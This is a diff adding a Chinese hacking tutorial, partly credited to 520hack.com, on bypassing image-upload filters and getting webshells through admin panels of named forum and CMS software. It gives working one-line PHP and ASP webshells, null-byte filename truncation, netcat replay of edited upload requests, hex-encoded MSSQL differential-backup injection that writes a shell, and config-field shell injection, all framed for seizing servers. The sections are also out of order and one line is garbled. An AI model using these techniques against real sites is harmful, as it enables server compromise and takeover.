@@ -1,0 +1,267 @@
+一般网站图片上传功能都对文件进行过滤，防止webshelll写入。但不同的程序对过滤也不一样，如何突破过滤继续上传？
+
+本文总结了七种方法，可以突破！
+
+ 
+
+1、文件头+GIF89a法。（php）//这个很好理解，直接在php马最前面写入gif89a，然后上传dama.php
+
+ 
+
+2、使用edjpgcom工具向图片注入代码。（php）//edjpgcom修改，加入php一句话保存为dama.php
+
+ 
+
+3、cmd命令下copy 图片.GIF+shell.php webshell.php （php） //估计和1是同样的原理，欺骗上传webshell.php
+
+ 
+
+4、C32asm打开图片在文件末尾空一格加入代码<?php eval($_POST[cmd])?> 。（php）//填充php一句话然后上传。
+
+ 
+
+5、在4基础上改进代码<?php fputs(fopen("error.php"."w")."<?eval(\$_POST[cmd]);?>")?> 。(php)//同
+
+目录下生成error.php，提问：asp的怎么改写？
+
+回答：asp测试的结果是：没有权限...
+
+<%
+
+Set MyFileObject=Server.CreateObject("Scripting.FileSystemObject")
+
+Set MyTextFile=MyFileObject.CreateTextFile("kafei.asp")
+
+MyTextFile.WriteLine("\<\%eval request(chr(35))\%\>")
+
+MyTextFile.Close
+
+%>
+
+ 
+
+6、IIS解析目录名漏洞1.php;.jpg (jpg) //这是文件名变量没有过滤。
+
+ 
+
+7、nc抓包改数据 //路径名和文件名没有过滤。
+
+//通过抓包修改上传路径通过/upload/1.asp+空格，使用软件把空格填充为00。然后nc提交获取webshell。
+
+等待补充...
+
+
+1、于是本地建了一个MDB数据库，写入
+┼攠數畣整爠煥敵瑳∨≡┩愾
+2、然后改为ASP上传，一句话木马上传成功了，再拿客户端去连的时候，出来了一流监控系统的提示
+估计前面的SHELL为空也是这东西搞的。。
+于是先将自己的SHELL用微软的screnc.exe进行加密。
+3、然后新建一个很小的图片。
+在CMD下面copy /b a.jpg+shell.asp rs.asp
+利用二进制的方式将两个文件合并在一起。 这次再上传，成功了，没有被那个监控系统挡下来。
+4、但是这时的SHELL要在FIREFOX下面才可以浏览，放到IE下面的话只会的到一张图片，而看不到SHELL 。
+因为前面将SHELL与图片合并在一起了，所以这时的SHELL里面有很多乱码，这时利用SHELL的远程文件下载功能。
+因为一流监控系统只会对向上传的数据进行检查，对服务器下载的数据并不会进行检测。
+将一个干净的SHELL下载到服务器上就行，先将SHELL存为TXT文件然后传到自己的服务器上，然后再利用SHELL提供的远程文件下载功能将那个TXT文件下载到服务器上面存为ASP，这样就拿到了一个干净的SHELL。
+
+================================================
+
+上传漏洞主要就是利用'\0'字符漏洞，'\0'字符在系统中被用作字符串结束的标志
+基本原理就是网络程序虽然禁止了.asp等后缀名文件的上传，但是都会允许.jpg或者.gif格式文件的上传。
+这样如果自己构造数据包 formPath=UploadFile/shell.asp'\0 '.jpg，那么'\0 '后面的字符将被截断，原因是计算机遇到'\0'字符，认为字符串结束了。于是我们就向服务器上传了一个名为shell.asp的ASP木马程序，后面的就不多说了，webshell的功能已经很强大了，如果再配合Serv-U取得server的管理员权限... 
+
+
+
+
+入侵过程：
+条件：需要至少NC、WinSock Expert、UltraEdit三个工具和一个webshell程序
+nc.exe(netcat) - 一个变形了的telnet，嗅探器，网络安全届的军刀！
+WinSock Expert - 抓包工具，可以截获网络通讯的数据流
+UltraEdit - ......不说了，无人不知无人不晓-_-!
+webshell - ASP、PHP等木马程序 
+
+
+
+
+1.第一步，打开目标系统的上传页面，通过WinSock Expert监视，上传webshell.asp文件，再打开WinSock Expert，将截获的数据流存为文本文件
+（两个send下面的所有内容，包括回车产生的空白行） 
+
+
+
+
+2.通过UltraEdit修改文本文件中的关键代码：filename="C:\test\webshell.asp"   ，webshell.asp后加：1个空格及.jpg，然后跳到16进制编辑状态，修改16进制下空格的20为00，Content-Length长度增加5。（一个字符算一个字节，' .jpg'一个5个字节） 
+
+
+
+
+3.nc出场~！^^
+指令：nc -vv www.xxx.com 80 < 1.txt
+
+后台拿web shell全集
+
+
+
+
+今天带给大家的都是些技术上的总结，有些人老问经验怎么来的，这个就是经验，希望大家都能成为脚本高手.  
+　　动网上传漏洞，相信大家拿下不少肉鸡 。可以说是动网让upfile.asp上传文件过滤不严的漏洞昭然天下，现在这种漏洞已经基本比较难见到了，不排除一些小网站仍然存在此漏洞。在拿站过程中，我们经常费了九牛两虎之力拿到管理员帐号和密码，并顺利进入了后台，虽然此时与拿到网站webshell还有一步之遥，但还是有许多新手因想不出合适的方法而被拒之门外。因此，我们把常用的从后台得到webshell的方法进行了总结和归纳，大体情况有以下十大方面。 
+　　注意：如何进入后台，不是本文讨论范围，其具体方法就不说了，靠大家去自己发挥。此文参考了前人的多方面的资料和信息，在此一并表示感谢。 
+　　一、直接上传获得webshell 
+　　这种对php和jsp的一些程序比较常见，MolyX BOARD就是其中一例，直接在心情图标管理上传.php类型，虽然没有提示，其实已经成功了，上传的文件url应该是http://forums/images/smiles/下，前一阵子的联众游戏站和网易的jsp系统漏洞就可以直接上传jsp文件。文件名是原来的文件名，bo-blog后台可以可以直接上传.php文件，上传的文件路径有提示。以及一年前十分流行的upfile.asp漏洞(动网5.0和6.0、早期的许多整站系统)，因过滤上传文件不严，导致用户可以直接上传webshell到网站任意可写目录中，从而拿到网站的管理员控制权限。 
+　　二、添加修改上传类型 
+　　现在很多的脚本程序上传模块不是只允许上传合法文件类型，而大多数的系统是允许添加上传类型，bbsxp后台可以添加asa　asP类型，ewebeditor的后台也可添加asa类型,通过修改后我们可以直接上传asa后缀的webshell了,还有一种情况是过滤了.asp，可以添加.aspasp的文件类型来上传获得webshell。php系统的后台，我们可以添加.php.g1f的上传类型，这是php的一个特性,最后的哪个只要不是已知的文件类型即可，php会将php.g1f作为.php来正常运行,从而也可成功拿到shell。LeadBbs3.14后台获得webshell方法是：在上传类型中增加asp ，注意，asp后面是有个空格的，然后在前台上传ASP马，当然也要在后面加个空格！ 七、asp+mssql系统 
+　　这里需要提一点动网mssql版，但是可以直接本地提交来备份的。首先在发帖那上传一个写有asp代码的假图片，然后记住其上传路径。写一个本地提交的表单，代码如下： 
+　　＜form act ion=http://网站/bbs/admin_data.asp?ac tion=RestoreData&act=Restore method="post"＞ 
+　　＜p＞已上传文件的位置：＜input name="Dbpath" type="text" size="80"＞＜/p＞ 
+　　＜p＞要复制到的位置：＜input name="backpath" type="text" size="80"＞＜/p＞ 
+　　＜p＞＜input type="submit" value="提交"＞＜/p＞ ＜/form＞ 
+　　另存为.htm本地执行。把假图片上传路径填在“已上传文件的位置”那里，想要备份的WebShell的相对路径填写在“要复制到的位置”那里，提交就得到我们可爱的WebShell了，恢复代码和此类似，修改相关地方就可以了。没有遇到过后台执行mssql命令比较强大的asp程序后台，动网的数据库还原和备份是个摆设，不能执行sql命令备份webshell，只能执行一些简单的查询命令。可以利用mssql注入差异备份webshell，一般后台是显示了绝对路径，只要有了注入点基本上就可以差异备份成功。下面是差异备份的主要语句代码，利用动网7.0的注入漏洞可以用差异备份一个webshell，可以用利用上面提到的方法，将conn.asp文件备份成.txt文件而获得库名。 
+　　差异备份的主要代码： 
+　　;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x626273 backup database @a to disk=@s-- 
+　　;Drop table [heige];create table [dbo].[heige] ([cmd] [image])-- 
+　　;insert into heige(cmd) values(0x3C2565786563757465207265717565737428226C2229253E)-- 
+　　;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x643A5C7765625C312E617370 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT-- 
+　　这段代码中，0x626273是要备份的库名bbs的十六进制，可以是其他名字比如bbs.bak; 0x3C2565786563757465207265717565737428226C2229253E是＜%execute request("l")%＞的十六进制，是lp最小马；0x643A5C7765625C312E617370是d:\web\1.asp的十六进制,也就是你要备份的webshell路径。当然也可以用比较常见备份方式来获得webshell，唯一的不足就是备份后的文件过大，如果备份数据库中有防下载的的数据表，或者有错误的asp代码，备份出来的webshell就不会成功运行，利用差异备份是成功率比较高的方法，并且极大的减少备份文件的大小。 
+　　八、php+mysql系统 
+　　后台需要有mysql数据查询功能,我们就可以利用它执行SELECT ... INTO OUTFILE查询输出php文件，因为所有的数据是存放在mysql里的，所以我们可以通过正常手段把我们的webshell代码插入mysql在利用SELECT ... INTO OUTFILE语句导出shell。 
+　　就可以暴出路径，php环境中比较容易暴出绝对路径：）。提一点的是遇到是mysql在win系统下路径应该这样写。下面的方法是比较常用的一个导出webshell的方法，也可以写个vbs添加系统管理员的脚本导出到启动文件夹，系统重起后就会添加一个管理员帐号 
+　　就会在up目录下生成文件名为saiy.php内容为的最小php木马， 最后用lanker的客户端来连接。实际运用中要考虑到文件夹是否有写权限。或者输入这样的代码 将会在当前目录生成一个a.php的最小马。 
+　　九、phpwind论坛从后台到webshell的三种方式 
+　　方式1 模板法 
+　　进入后台， 风格模版设置 ，在随便一行写代码，记住，这代码必须顶着左边行写，代码前面不可以有任何字符。 
+　　方始2 脏话过滤法 
+　　方式3 用户等级管理 
+　　以上三种方式得到webshellr的密码是a,为lanker的一句话后门服务端。 
+　　十、也可以利用网站访问计数系统记录来获得webshell 
+　　解决方案 
+　　由于本文涉及的代码版本很多，所以不可能提供一个完美的解决方案。有能力者可以针对本文提到的漏洞文件进行适当修补，若漏洞文件不影响系统使用也可删除此文件。大家如果不会修补，可以到相关官方网站下载最新补丁进行修复更新。同时也请大家能时刻关注各大安全网络发布的最新公告，若自己发现相关漏洞也可及时通知官方网站。 
+　　后记 
+　　其实，从后台得到webshell的技巧应该还有很多的，关键是要看大家怎么灵活运用、触类旁通，希望本文的方法能起到抛砖引玉的作用。 各位加油吧，让我们将服务器控制到底！ 
+　　三、利用后台管理功能写入webshell 
+　　上传漏洞基本上补的也差不多了,所以我们进入后台后还可以通过修改相关文件来写入webshell。比较的典型的有dvbbs6.0，还有leadbbs2.88等，直接在后台修改配置文件，写入后缀是asp的文件。而LeadBbs3.14后台获得webshell另一方法是：添加一个新的友情链接，在网站名称处写上冰狐最小马即可,最小马前后要随便输入一些字 
+，http:\\网站\inc\IncHtm\BoardLink.asp就是我们想要的shell。  
+　　四、利用后台管理向配置文件写webshell 
+　　利用"""":""//"等符号构造最小马写入程序的配置文件，joekoe论坛，某某同学录，沸腾展望新闻系统，COCOON Counter统计程序等等，还有很多php程序都可以，COCOON Counter统计程序举例，在管理邮箱处添上cnhacker@263.net":eval request(chr (35))//, 在配制文件中就是webmail="cnhacker@263.net\":eval request(chr(35))//"，还有一种方法就是写上 cnhacker@263.net"%＞＜%eval request(chr(35))%＞＜%’，这样就会形成前后对应，最小马也就运行了。＜%eval request(chr(35))%＞可以用lake2的eval发送端以及最新的2006 客户端来连，需要说明的是数据库插马时候要选前者。再如动易2005，到文章中心管理-顶部菜单设置-菜单其它特效，插入一句话马"%＞＜%execute request("l")%＞＜%’，保 存顶部栏目菜单参数设置成功后，我们就得到马地址http://网站/admin/rootclass_menu_config.asp。 
+　　五、利用后台数据库备份及恢复获得webshell 
+　　主要是利用后台对access数据库的“备份数据库”或“恢复数据库”功能，“备份的数据库路径”等变量没有过滤导致可以把任意文件后缀改 为asp，从而得到webshell，msssql版的程序就直接应用了access版的代码，导致sql版照样可以利用。还可以备份网站asp文件为其他后缀 如.txt文件，从而可以查看并获得网页源代码，并获得更多的程序信息增加获得webshell的机会。在实际运用中经常会碰到没有上传功能的时 候，但是有asp系统在运行，利用此方法来查看源代码来获得其数据库的位置，为数据库插马来创造机会，动网论坛就有一个ip地址的数据库，在后台的ip管理中可以插入最小马然后备份成.asp文件即可。在谈谈突破上传检测的方法，很多asp程序在即使改了后缀名后也会提示文件非法，通过在.asp文件头加上gif89a修改后缀为gif来骗过asp程序检测达到上传的目的，还有一种就是用记事本打开图片文件，随便粘贴一部分复制到asp木马文件头，修改gif后缀后上传也可以突破检测，然后备份为.asp文件，成功得到webshell。 
+　　六、利用数据库压缩功能 
+　　可以将数据的防下载失效从而使插入数据库的最小马成功运行，比较典型的就是loveyuki的L-BLOG，在友情添加的url出写上＜%eval request (chr(35))%＞, 提交后，在数据库操作中压缩数据库，可以成功压缩出.asp文件，用海洋的最小马的eval客户端连就得到一个webshell。
+本篇文章来源于 新世纪网安基地 (www.520hack.com) 原文出处：http://www.520hack.com/Article/Text2/200911/16637.html
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
